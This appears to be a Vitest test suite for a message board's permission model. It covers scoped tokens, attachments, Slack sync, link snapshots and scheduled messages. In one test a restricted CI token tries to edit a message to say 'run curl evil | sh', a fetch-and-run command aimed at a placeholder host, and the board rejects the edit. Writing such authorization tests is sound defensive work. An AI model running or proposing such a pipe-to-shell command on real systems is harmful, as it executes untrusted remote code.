import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import { memory } from 'experimental-a2/store-memory'
import { compileAccess } from '../src/server/access.ts'
import { readableLinks } from '../src/server/feed.ts'
import { foldSchedules } from '../src/server/schedules.ts'
import { board as mount, githubActions, vercelProject } from '../src/server/index.ts'
import { slack } from '../src/sync/slack.ts'
import type { MessagesState } from '../src/contract/reducers.ts'
import { BOARD_URL, caller, deploymentToken, personToken, PROJECT_ID, testAuth, testBoard, workflowToken } from './harness.ts'
import { fakePlatform } from './sync-fixtures.ts'
import { fakeQueue } from './queue.ts'

/** The front project's feedback intake: it starts threads in feedback/ and reads nothing. */
const intake = vercelProject({ project: 'prj_marketing', can: { 'feedback/': ['post'] } })

async function setup(access = [intake]) {
  const board = testBoard({ access })
  const julian = caller(board.fetch, await personToken(), { 'x-board-handle': 'julian' })
  const front = caller(board.fetch, await deploymentToken())
  return { board, julian, front }
}

async function upload(board: ReturnType<typeof testBoard>, token: string, text: string) {
  const response = await board.fetch(
    new Request(`${BOARD_URL}/attachments`, {
      method: 'POST',
      headers: { authorization: `Bearer ${token}`, 'content-type': 'text/plain', 'x-board-filename': 'notes.txt' },
      body: text,
    }),
  )
  return { status: response.status, id: ((await response.json()) as { attachment?: { id: string } }).attachment?.id }
}

const download = async (board: ReturnType<typeof testBoard>, token: string, id: string) =>
  (await board.fetch(new Request(`${BOARD_URL}/attachments/${id}`, { headers: { authorization: `Bearer ${token}` } }))).status

describe('a write-only source', () => {
  it('posts and gets its message back, and reads nothing', async () => {
    const { julian, front } = await setup()
    await julian('POST', '/messages', { channel: 'feedback/front', text: 'the team’s own notes' })
    const posted = await front('POST', '/messages', { channel: 'feedback/front', text: 'checkout is slow' })
    expect(posted).toMatchObject({ status: 201, body: { message: { text: 'checkout is slow', channel: 'feedback/front' } } })
    const id = posted.body.message.id

    expect((await front('GET', '/messages')).body.messages).toEqual([])
    expect((await front('GET', '/threads')).body.threads).toEqual([])
    expect((await front('GET', '/channels')).body.channels).toEqual([])
    expect((await front('GET', '/events?after=0')).body.events).toEqual([])
    expect((await front('GET', `/messages/${id}`)).status).toBe(404)
    // Its own actor, so `vb whoami` and the inspector still know who it is.
    expect((await front('GET', '/actors')).body.actors.map((a: { id: string }) => a.id)).toEqual(['vercel:project:prj_marketing:production'])
    expect((await front('GET', '/me')).body).toMatchObject({ principal: 'vercel:project:prj_marketing:production', can: { 'feedback/': ['post'] } })
  })

  it('can’t address a thread, even its own, but can fix what it wrote', async () => {
    const { front } = await setup()
    const id = (await front('POST', '/messages', { channel: 'feedback', text: 'checkout is slow' })).body.message.id
    expect((await front('POST', '/messages', { re: id, text: 'and search' })).status).toBe(404)
    expect((await front('POST', `/messages/${id}/reactions`, { emoji: 'eyes' })).status).toBe(404)
    expect((await front('POST', `/messages/${id}/labels`, { set: { kind: 'bug' } })).status).toBe(404)
    expect((await front('POST', `/messages/${id}/edit`, { text: 'checkout is very slow' })).status).toBe(200)
    expect((await front('POST', `/messages/${id}/delete`, {})).status).toBe(200)
  })

  it('needs label to label what it posts', async () => {
    const { front } = await setup()
    const labeled = await front('POST', '/messages', { channel: 'feedback', text: 'slow', labels: { kind: 'task' } })
    expect(labeled).toMatchObject({ status: 403, body: { error: { message: "this token can't label in feedback" } } })
    const { front: labeler } = await setup([vercelProject({ project: 'prj_marketing', can: { 'feedback/': ['post', 'label'] } })])
    expect((await labeler('POST', '/messages', { channel: 'feedback', text: 'slow', labels: { kind: 'task' } })).status).toBe(201)
  })

  it('streams bare cursors and nothing else', async () => {
    const { board, julian } = await setup()
    const controller = new AbortController()
    const response = await board.fetch(
      new Request(`${BOARD_URL}/events?after=0`, {
        headers: { authorization: `Bearer ${await deploymentToken()}`, accept: 'text/event-stream' },
        signal: controller.signal,
      }),
    )
    const posted = (await julian('POST', '/messages', { channel: 'feedback', text: 'triaged' })).body.message.id
    const reader = response.body!.getReader()
    const decoder = new TextDecoder()
    let text = ''
    while (!text.includes(`id: ${posted}\n`)) text += decoder.decode((await reader.read()).value)
    expect(text).not.toContain('event: board')
    expect(text).not.toContain('triaged')
    controller.abort()
    await reader.cancel()
  })

  it('doesn’t list who an ambiguous mention could be', async () => {
    const { board, front } = await setup()
    for (const user of ['u_sam1', 'u_sam2'])
      await caller(board.fetch, await personToken(user), { 'x-board-handle': 'sam' })('POST', '/messages', { channel: 'dev', text: 'hi' })
    const mention = await front('POST', '/messages', { channel: 'feedback', text: 'thanks @sam' })
    expect(mention).toMatchObject({ status: 400, body: { error: { code: 'ambiguous_mention', message: 'ambiguous mention @sam: use @[actor-id]' } } })
  })
})

describe('attachments', () => {
  it('are readable by their uploader, and where a message carrying them is', async () => {
    const access = [intake, githubActions({ repository: 'basehub-ai/www', can: { 'feedback/': ['post'], ci: ['read'] } })]
    const { board, julian, front } = await setup(access)
    const ci = caller(board.fetch, await workflowToken())
    const file = await upload(board, await deploymentToken(), 'repro steps')
    expect(file.status).toBe(201)
    expect(await download(board, await deploymentToken(), file.id!)).toBe(200)
    expect(await download(board, await workflowToken(), file.id!)).toBe(404)
    // A file can't move from where its uploader put it into a channel someone else posts in.
    expect((await ci('POST', '/messages', { channel: 'feedback', text: 'mine now', attachments: [file.id] })).status).toBe(404)

    expect((await front('POST', '/messages', { channel: 'feedback', text: 'see notes', attachments: [file.id] })).status).toBe(201)
    expect(await download(board, await personToken(), file.id!)).toBe(200)
    expect(await download(board, await workflowToken(), file.id!)).toBe(404)
    const shared = await upload(board, await personToken(), 'build log')
    await julian('POST', '/messages', { channel: 'ci', text: 'log', attachments: [shared.id] })
    expect(await download(board, await workflowToken(), shared.id!)).toBe(200)
  })

  it('go into a schedule only where its creator may read them', async () => {
    const board = testBoard({ scheduler: fakeQueue().scheduler, access: [githubActions({ repository: 'basehub-ai/www', can: { ci: ['read', 'post'] } })] })
    const file = await upload(board, await personToken(), 'the plan')
    await caller(board.fetch, await personToken())('POST', '/messages', { channel: 'security', text: 'plan', attachments: [file.id] })
    const ci = caller(board.fetch, await workflowToken())
    expect((await ci('POST', '/schedules', { channel: 'ci', text: 'mine later', in: '1h', attachments: [file.id] })).status).toBe(404)
    const mine = await upload(board, await workflowToken(), 'build log')
    expect((await ci('POST', '/schedules', { channel: 'ci', text: 'log later', in: '1h', attachments: [mine.id] })).status).toBe(201)
  })

  it('need post somewhere to upload', async () => {
    const { board } = await setup([githubActions({ repository: 'basehub-ai/www', can: ['read'] })])
    expect((await upload(board, await workflowToken(), 'x')).status).toBe(403)
  })
})

describe('x-board-scope', () => {
  it('narrows what a full-access token reads', async () => {
    const { board, julian } = await setup()
    await julian('POST', '/messages', { channel: 'dev', text: 'in dev' })
    await julian('POST', '/messages', { channel: 'security', text: 'in security' })
    const pi = caller(board.fetch, await personToken(), { 'x-board-scope': 'dev/=read,post' })
    expect((await pi('GET', '/messages')).body.messages.map((m: { text: string }) => m.text)).toEqual(['in dev'])
    expect((await pi('GET', '/channels')).body.channels.map((c: { path: string }) => c.path)).toEqual(['dev'])
  })
})

describe('links', () => {
  it('show nothing of a linked board message the reader can’t read', () => {
    const messages = { byId: { 7: { id: 7, channel: 'security' } }, replies: {} } as unknown as MessagesState
    const link = { url: 'https://slack.test/p1', message: 7, snapshot: { author: 'ada', text: 'the key is…', createdAt: null, files: [] }, unavailable: null }
    expect(readableLinks([link], { access: compileAccess({ 'dev/': ['read'] }), messages })).toEqual([
      { url: link.url, message: null, snapshot: null, unavailable: 'not_readable' },
    ])
    expect(readableLinks([link], { access: compileAccess({ security: ['read'] }), messages })).toEqual([link])
  })

  it('show nothing of it on any route', async () => {
    const s = fakePlatform('slack')
    const board = testBoard({ sync: { slack: slack({ adapter: s.adapter, channels: { C1: 'open', C2: 'security' } }) } })
    const webhook = (body: unknown) =>
      board.fetch(new Request(`${BOARD_URL}/webhooks/slack`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) }))
    const julian = caller(board.fetch, await personToken())
    const secret = '1791322095.443859'
    await webhook({ type: 'message', threadId: `slack:C2:${secret}`, id: secret, text: 'the key is hunter2', user: 'U_ADA', name: 'Ada' })
    await vi.waitFor(async () => expect((await julian('GET', '/messages?channel=security')).body.messages).toHaveLength(1))
    const permalink = `https://acme.slack.com/archives/C2/p${secret.replace('.', '')}`
    const ts = '1791322999.000001'
    await webhook({ type: 'message', threadId: `slack:C1:${ts}`, id: ts, text: `see ${permalink}`, user: 'U_JB', raw: { type: 'message', ts, text: `see <${permalink}>` } })
    await vi.waitFor(async () => expect((await julian('GET', '/messages?channel=open')).body.messages).toHaveLength(1))
    expect((await julian('GET', '/messages?channel=open')).body.messages[0].links[0].snapshot.text).toBe('the key is hunter2')

    const open = caller(board.fetch, await personToken(), { 'x-board-scope': 'open=read' })
    const hidden = { message: null, snapshot: null, unavailable: 'not_readable' }
    const [message] = (await open('GET', '/messages')).body.messages
    expect(message.links[0], '/messages').toMatchObject(hidden)
    expect((await open('GET', '/threads')).body.threads[0].message.links[0], '/threads').toMatchObject(hidden)
    expect((await open('GET', `/messages/${message.id}`)).body.message.links[0], '/messages/:id').toMatchObject(hidden)
    expect(JSON.stringify((await open('GET', '/events?after=0')).body.events), '/events').not.toContain('hunter2')
  })
})

describe('sync', () => {
  /** security/ mirrors Slack's C1, where a thread is already on the board; a workflow syncs in ci/ only. */
  async function mirrored() {
    const s = fakePlatform('slack')
    const board = testBoard({
      sync: { slack: slack({ adapter: s.adapter, channels: { C1: 'security' } }) },
      access: [githubActions({ repository: 'basehub-ai/www', can: { 'ci/': ['read', 'post', 'sync'] } })],
    })
    const webhook = (body: unknown) =>
      board.fetch(new Request(`${BOARD_URL}/webhooks/slack`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) }))
    const julian = caller(board.fetch, await personToken())
    await webhook({ type: 'message', threadId: 'slack:C1:100', id: '100', text: 'incident root', user: 'U_ADA' })
    await vi.waitFor(async () => expect((await julian('GET', '/messages?channel=security')).body.messages).toHaveLength(1))
    const [root] = (await julian('GET', '/messages?channel=security')).body.messages
    return { s, webhook, julian, root, ci: caller(board.fetch, await workflowToken()) }
  }

  it('can’t take over a platform thread another thread is synced with', async () => {
    const { webhook, julian, root, ci } = await mirrored()
    const tap = (await ci('POST', '/messages', { channel: 'ci/x', text: 'tap' })).body.message.id
    const taken = await ci('POST', `/messages/${tap}/sync`, { target: 'slack:C1:100' })
    expect(taken).toMatchObject({ status: 409, body: { error: { code: 'already_synced', message: 'slack:C1:100 is already synced with another thread' } } })
    expect((await ci('POST', '/messages', { channel: 'ci/y', text: 'tap', sync: ['slack:C1:100'] })).status).toBe(409)
    // Someone who reads that thread learns which it is.
    const mine = (await julian('POST', '/messages', { channel: 'dev', text: 'mine' })).body.message.id
    expect((await julian('POST', `/messages/${mine}/sync`, { target: 'slack:C1:100' })).body.error.message).toBe(`slack:C1:100 is already synced with #${root.id}`)

    await webhook({ type: 'message', threadId: 'slack:C1:100', id: '101', text: 'the secret reply', user: 'U_ADA' })
    await vi.waitFor(async () => expect((await julian('GET', `/messages/${root.id}`)).body.replies.map((r: { text: string }) => r.text)).toEqual(['the secret reply']))
    expect((await ci('GET', '/messages?channel=ci/')).body.messages.map((m: { text: string }) => m.text)).toEqual(['tap'])
  })

  it('doesn’t tell a caller that reads one channel where other threads sync', async () => {
    const { julian, root, ci } = await mirrored()
    expect((await julian('POST', `/messages/${root.id}/sync`, { target: 'slack:C9:900.1' })).body).toMatchObject({ attached: true })
    const all = (await julian('GET', '/events?after=0&all=1')).body.events.map((event: { type: string }) => event.type)
    expect(all).toContain('thread.synced')
    await ci('POST', '/messages', { channel: 'ci/x', text: 'build' })
    const events = (await ci('GET', '/events?after=0&all=1')).body.events
    expect(events.map((event: { type: string }) => event.type)).toEqual(['message.posted'])
  })

  it('still attaches a thread to one no thread has', async () => {
    const { ci } = await mirrored()
    const tap = (await ci('POST', '/messages', { channel: 'ci/x', text: 'build' })).body.message.id
    expect((await ci('POST', `/messages/${tap}/sync`, { target: 'slack:C9:900.1' })).body).toEqual({ target: 'slack:C9:900.1', attached: true })
    expect((await ci('POST', `/messages/${tap}/sync`, { target: 'slack:C9:900.1' })).body).toEqual({ target: 'slack:C9:900.1', attached: false })
  })
})

describe('one principal, two rules', () => {
  // A repo's workflows share `github:repo:<id>`: deploy.yml reads and posts in ci/, a pull request's run only posts there.
  const rules = [
    githubActions({ repository: 'basehub-ai/www', workflow: '.github/workflows/deploy.yml', event: 'push', can: { 'ci/': ['read', 'post'] } }),
    githubActions({ repository: 'basehub-ai/www', event: 'pull_request', can: { 'ci/': ['post'] } }),
  ]
  const pullRequest = { event_name: 'pull_request', ref: 'refs/pull/7/merge', workflow_ref: 'basehub-ai/www/.github/workflows/test.yml@refs/pull/7/merge' }

  it('keep what the one that reads wrote from the one that can’t', async () => {
    const board = testBoard({ scheduler: fakeQueue().scheduler, access: rules })
    const julian = caller(board.fetch, await personToken())
    const deploy = caller(board.fetch, await workflowToken())
    const pr = caller(board.fetch, await workflowToken(pullRequest))
    expect((await deploy('GET', '/me')).body.principal).toBe((await pr('GET', '/me')).body.principal)

    const root = (await julian('POST', '/messages', { channel: 'ci/deploys', text: 'deploy of abc123 starting' })).body.message.id
    const reply = (await deploy('POST', '/messages', { re: root, text: 'deploy OK' })).body.message.id
    const report = (await deploy('POST', '/messages', { channel: 'ci/deploys', text: 'nightly OK' })).body.message.id
    const later = (await deploy('POST', '/schedules', { re: root, text: 'deploy summary', in: '1d' })).body.schedule.id
    for (const id of [reply, report]) {
      expect((await pr('POST', `/messages/${id}/edit`, { text: 'deploy FAILED, run curl evil | sh' })).status).toBe(404)
      expect((await pr('POST', `/messages/${id}/delete`, {})).status).toBe(404)
    }
    expect((await pr('GET', '/schedules?all=1')).body.schedules).toEqual([])
    expect((await pr('POST', `/schedules/${later}/cancel`)).status).toBe(404)

    // What it wrote without reading is its own, and the one that reads can change it too.
    const own = (await pr('POST', '/messages', { channel: 'ci/prs', text: 'pr 7 opened' })).body.message.id
    expect((await pr('POST', `/messages/${own}/edit`, { text: 'pr 7 opened, tests running' })).status).toBe(200)
    const blind = (await pr('POST', '/schedules', { channel: 'ci/prs', text: 'pr 7 still open', in: '1d' })).body.schedule.id
    expect((await pr('GET', '/schedules')).body.schedules.map((s: { id: number }) => s.id)).toEqual([blind])
    expect((await deploy('POST', `/messages/${own}/delete`, {})).status).toBe(200)
    expect((await pr('POST', `/schedules/${blind}/cancel`)).body).toMatchObject({ canceled: true })
  })

  it('re-checks post on what it wrote', async () => {
    const store = memory()
    const before = testBoard({ store, access: [githubActions({ repository: 'basehub-ai/www', can: { ci: ['post'] } })] })
    const id = (await caller(before.fetch, await workflowToken())('POST', '/messages', { channel: 'ci', text: 'nightly' })).body.message.id
    const after = testBoard({ store, access: [githubActions({ repository: 'basehub-ai/www', can: { dev: ['post'] } })] })
    const ci = caller(after.fetch, await workflowToken())
    expect(await ci('POST', `/messages/${id}/edit`, { text: 'nightly, again' })).toMatchObject({ status: 403, body: { error: { message: "this token can't post in ci" } } })
    expect((await ci('POST', `/messages/${id}/delete`, {})).status).toBe(403)
  })
})

describe('schedules', () => {
  const T0 = Date.parse('2026-10-07T12:00:00.000Z')
  beforeEach(() => {
    vi.useFakeTimers({ toFake: ['Date'] })
    vi.setSystemTime(T0)
  })
  afterEach(() => vi.useRealTimers())

  /** Two deployments of the same board, before and after its access changed: one store, one queue. */
  async function deploys(before: Parameters<typeof githubActions>[0]['can'], after: Parameters<typeof githubActions>[0]['can']) {
    const queue = fakeQueue()
    const { memory } = await import('experimental-a2/store-memory')
    const store = memory()
    const first = testBoard({ store, scheduler: queue.scheduler, access: [githubActions({ repository: 'basehub-ai/www', can: before })] })
    const ci = caller(first.fetch, await workflowToken())
    const scheduled = await ci('POST', '/schedules', { channel: 'ci', text: 'nightly: green', in: '1h' })
    expect(scheduled.status).toBe(201)
    const second = testBoard({ store, scheduler: queue.scheduler, access: [githubActions({ repository: 'basehub-ai/www', can: after })] })
    await new Promise((resolve) => setTimeout(resolve, 20))
    vi.setSystemTime(T0 + 61 * 60_000)
    await queue.fire()
    await new Promise((resolve) => setTimeout(resolve, 20))
    const julian = caller(second.fetch, await personToken())
    const [schedule] = (await julian('GET', '/schedules?all=1')).body.schedules
    return { schedule, messages: (await julian('GET', '/messages?channel=ci')).body.messages }
  }

  it('send with what their creator may do now', async () => {
    const { schedule, messages } = await deploys({ ci: ['post'] }, { ci: ['read', 'post'] })
    expect(schedule).toMatchObject({ state: 'done', sent: 1 })
    expect(messages).toMatchObject([{ text: 'nightly: green', by: { principal: 'github:repo:123456' } }])
  })

  it('are canceled as revoked once their creator can’t post', async () => {
    const { schedule, messages } = await deploys({ ci: ['post'] }, { ci: ['read'] })
    expect(schedule).toMatchObject({ state: 'canceled', sent: 0, canceled: { reason: 'revoked' } })
    expect(messages).toEqual([])
  })

  it('are canceled by their creator, or by manage', async () => {
    const queue = fakeQueue()
    const board = testBoard({ scheduler: queue.scheduler, access: [githubActions({ repository: 'basehub-ai/www', can: { ci: ['post', 'read'] } })] })
    const ci = caller(board.fetch, await workflowToken())
    const julian = caller(board.fetch, await personToken())
    const mine = (await ci('POST', '/schedules', { channel: 'ci', text: 'mine', in: '1h' })).body.schedule.id
    const theirs = (await julian('POST', '/schedules', { channel: 'ci', text: 'theirs', in: '1h' })).body.schedule.id
    expect((await ci('POST', `/schedules/${mine}/cancel`)).body).toMatchObject({ canceled: true })
    expect(await ci('POST', `/schedules/${theirs}/cancel`)).toMatchObject({ status: 403, body: { error: { message: "this token can't manage ci" } } })
    expect((await julian('POST', `/schedules/${theirs}/cancel`)).body).toMatchObject({ canceled: true })
  })

  it('are their creator’s only where it can post: one token narrowed two ways is two callers', async () => {
    const board = testBoard({ scheduler: fakeQueue().scheduler })
    const dev = caller(board.fetch, await personToken(), { 'x-board-scope': 'dev/=post' })
    const ci = caller(board.fetch, await personToken(), { 'x-board-scope': 'ci/=read,post' })
    const id = (await dev('POST', '/schedules', { channel: 'dev', text: 'in dev', in: '1h' })).body.schedule.id
    expect((await dev('GET', '/schedules')).body.schedules).toMatchObject([{ id, text: 'in dev' }])
    expect((await ci('GET', '/schedules')).body.schedules).toEqual([])
    expect((await ci('POST', `/schedules/${id}/cancel`)).status).toBe(404)
    expect((await dev('POST', `/schedules/${id}/cancel`)).body).toMatchObject({ canceled: true })
  })

  it('keep plain data in their state, which A2 clones and snapshots', () => {
    const as = {
      author: { actor: 'github:repo:123456', principal: 'github:repo:123456', profile: null, session: null },
      principal: { id: 'github:repo:123456', kind: 'workflow' as const, handle: 'basehub-ai/www', scope: 'ci=post' },
      actor: { id: 'github:repo:123456', kind: 'workflow' as const, handle: 'basehub-ai/www', name: 'basehub-ai/www', avatar: null },
    }
    const payload = { channel: 'ci', re: null, text: 'nightly', labels: {}, noSync: false, first: T0, every: null, until: null, times: null, as }
    const event = { index: 1, type: 'schedule.created', createdAt: T0, payload } as unknown as Parameters<typeof foldSchedules>[1]
    const state = foldSchedules({ byId: {} }, event)
    expect(structuredClone(state)).toEqual(state)
  })

  /** Fires the queue an hour on and reads the board's only schedule back. */
  async function sendAndRead(fetch: (request: Request) => Promise<Response>, queue: ReturnType<typeof fakeQueue>) {
    await new Promise((resolve) => setTimeout(resolve, 20))
    vi.setSystemTime(T0 + 61 * 60_000)
    await queue.fire()
    await new Promise((resolve) => setTimeout(resolve, 20))
    const [schedule] = (await caller(fetch, await personToken())('GET', '/schedules?all=1')).body.schedules
    return schedule
  }

  it('send from the board’s own code and its own production', async () => {
    vi.stubEnv('VERCEL_ENV', 'production')
    try {
      for (const make of ['client', 'production'] as const) {
        vi.setSystemTime(T0)
        const queue = fakeQueue()
        const board = testBoard({ scheduler: queue.scheduler })
        if (make === 'client') await board.client('ops').schedule('ops', { text: 'from ops', in: '1h' })
        else expect((await caller(board.fetch, await deploymentToken('board', PROJECT_ID))('POST', '/schedules', { channel: 'ops', text: 'from prod', in: '1h' })).status).toBe(201)
        expect(await sendAndRead(board.fetch, queue), make).toMatchObject({ state: 'done', sent: 1 })
      }
    } finally {
      vi.unstubAllEnvs()
    }
  })

  it('send from a project named without its team, where the scheduler can’t work the team out', async () => {
    vi.stubEnv('VERCEL_ORG_ID', '')
    vi.stubEnv('VERCEL_OIDC_TOKEN', '')
    try {
      // The board route and the scheduler route are two functions: the one that sends never sees a request.
      const store = memory()
      const queue = fakeQueue()
      const access = [vercelProject({ project: 'marketing', environments: ['production'], can: { deploys: ['post'] } })]
      const options = { store, url: BOARD_URL, project: { id: PROJECT_ID }, auth: testAuth, access, scheduler: queue.scheduler }
      const route = mount(options)
      mount(options)
      const platform = await deploymentToken('board', PROJECT_ID)
      const marketing = caller(route.fetch, await deploymentToken(), { 'x-vercel-oidc-token': platform })
      expect((await marketing('POST', '/schedules', { channel: 'deploys', text: 'nightly deploy check', in: '1h' })).status).toBe(201)
      expect(await sendAndRead(route.fetch, queue)).toMatchObject({ state: 'done', sent: 1 })
    } finally {
      vi.unstubAllEnvs()
    }
  })

  it('from before the board kept claims are re-checked from the principal ID', async () => {
    vi.stubEnv('VERCEL_ENV', 'production')
    try {
      const sent: Record<string, unknown> = {}
      const callers = {
        own: () => deploymentToken('board', PROJECT_ID),
        byId: () => deploymentToken('marketing', 'prj_marketing'),
        byName: () => deploymentToken('docs', 'prj_docs'),
        workflow: () => workflowToken(),
      }
      for (const [who, token] of Object.entries(callers)) {
        // A store that drops the claims from each schedule, as a board before this one wrote it.
        const store = memory()
        const append = store.append.bind(store)
        store.append = ((session, events, options) =>
          append(
            session,
            events.map((event: any) => {
              if (event.type !== 'schedule.created') return event
              const { facts: _facts, ...principal } = event.payload.as.principal
              return { ...event, payload: { ...event.payload, as: { ...event.payload.as, principal } } }
            }),
            options,
          )) as typeof store.append
        const queue = fakeQueue()
        const access = [
          vercelProject({ project: 'prj_marketing', can: 'all' }),
          vercelProject({ project: 'docs', can: 'all' }),
          githubActions({ repository: 'basehub-ai/www', can: 'all' }),
        ]
        const board = testBoard({ store, scheduler: queue.scheduler, access })
        expect((await caller(board.fetch, await token())('POST', '/schedules', { channel: 'dev', text: who, in: '1h' })).status).toBe(201)
        const schedule = await sendAndRead(board.fetch, queue)
        sent[who] = { sent: schedule.sent, reason: schedule.canceled?.reason ?? null }
        vi.setSystemTime(T0)
      }
      expect(sent).toEqual({
        own: { sent: 1, reason: null },
        byId: { sent: 1, reason: null },
        byName: { sent: 0, reason: 'revoked' },
        workflow: { sent: 0, reason: 'revoked' },
      })
    } finally {
      vi.unstubAllEnvs()
    }
  })
})
